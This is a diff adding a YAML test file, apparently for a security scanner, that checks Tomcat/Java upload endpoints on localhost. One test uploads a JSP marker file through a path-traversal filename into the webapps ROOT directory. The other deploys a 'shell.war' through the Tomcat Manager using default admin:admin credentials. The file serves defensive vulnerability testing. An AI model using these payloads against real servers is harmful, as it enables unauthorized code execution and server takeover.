@@ -1,0 +1,40 @@
+name: "Upload — Tomcat / Java (WAR & JSP)"
+variables:
+  base_url: "http://localhost:8080"
+defaults:
+  read_timeout: 15
+  verify: false
+  follow_redirects: true
+
+tests:
+  - id: tomcat-jsp-traversal
+    name: "JSP avec Path Traversal vers le répertoire webapps"
+    severity: critical
+    request:
+      method: POST
+      path: "/upload"
+      multipart:
+        - name: "file"
+          filename: "../../../../../../opt/tomcat/webapps/ROOT/shell.jsp"
+          content: "<% out.println(\"TOMCAT_PWNED_MOWING_DEVIL\"); %>"
+          content_type: "application/octet-stream"
+    assert:
+      - status: 200
+      - body_regex: "(?i)(success|uploaded)"
+
+  - id: tomcat-war-deploy
+    name: "Déploiement WAR malveillant via Manager (Credentials par défaut)"
+    severity: critical
+    request:
+      method: POST
+      path: "/manager/html/upload"
+      headers:
+        Authorization: "Basic YWRtaW46YWRtaW4=" # admin:admin
+      multipart:
+        - name: "deployWar"
+          filename: "shell.war"
+          content: "UEsDBBQACAgIAAA..." # Payload WAR base64 ou brut (mini web.xml + shell.jsp)
+          content_type: "application/octet-stream"
+    assert:
+      - status: 200
+      - body_regex: "(?i)(OK|deployed|succès)"
